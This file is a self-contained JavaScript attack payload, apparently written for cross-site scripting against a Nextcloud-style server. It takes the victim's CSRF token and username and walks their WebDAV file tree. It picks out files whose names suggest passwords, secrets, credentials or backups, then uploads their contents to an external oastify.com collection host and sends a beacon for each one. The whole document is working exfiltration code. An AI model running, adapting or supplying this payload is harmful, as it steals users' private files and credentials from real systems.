(function(){

  // Regex to filter file list to
  /*
  var filematch = /.+\/$/;  // Only directories
  var filematch = /.+(\/|\.docx)$/;  // Directories and docx
  var filematch = /.+/;  // Everything
  var filematch = /.+(\.pdf|\.docx)$/;  // PDF and docx
  var filematch = /.+\.docx$/;  // just docx
  */
  var filematch = /.*(pass|secret|cred|account|backup).*/i;  // Sensitive looking files
  var beaconurl = 'https://s70ug9uryyk8zeus71rki2mreik982wr.oastify.com'; // Where to message back to
  var recurse = true; // Recurse into dirs
  var steal = true;   // Exfil the file out to beacon URL
  var token = null;
  var username = null;
  var davbase = "/remote.php/dav/files/";

  function stealFile( filename ){
    console.log('Stealing file',filename)
    fetch( davbase + username + filename, {
      headers: {
        'requesttoken': token
      }
    })
    .then((response) => response.blob())
    .then((data) => {
      return fetch(
        beaconurl + '/' + username + filename, {
          method: 'POST',
          body: data,
          mode: 'no-cors'
        }
      )
    })
  }

  // Get file listing for that user's dir
  function listDir( d ){
    var files = [];
    console.log('Fetching listing for',username,d,token)
    fetch(davbase+username+d,{
      method: 'PROPFIND',
      headers: {
        'requesttoken': token
      }
    })
    .then((response) => response.text())
    .then((data) => {
      [...data.matchAll(/<d:href>([^<]+)<\/d:href>/g)].forEach( (m) => {
        var f = m[1]
        f = f.replace(davbase+username,'')
        if( d == f ) return;
        files.push(f);
      });

      // Recurse into directories
      if( recurse ){
        files.filter( f => f.match(/\/$/) != null ).forEach((d) => {
          if( d == '/' ) return;
          listDir(d);
        });
      }

      // Filter by regex
      files = files.filter(f => f.match(filematch) != null );
      console.log('Filtered:',files)

      files.forEach(function(f){

        // Beacon back found file
        new Image().src=beaconurl + '/' + username + f;
        
        // Post the file off to beacon URL
        if( steal ){
          stealFile( f );
        }
      });
    })
  }

  // Get the OnlyOffice signed download URLs for each of these files


  // Get CSRF token
  fetch('/index.php/csrftoken')
  .then((response) => response.json())
  .then((data) => {
    token = data['token'];
  })

  // Get username
  .then(()=>{
    return fetch('/index.php/apps/dashboard/')
  })
  .then((response) => response.text())
  .then((data) => {
    username = data.match(/<head data-user="([^"]+)"/)[1];
  })
  .then(()=>{
    listDir('');
  })
})();

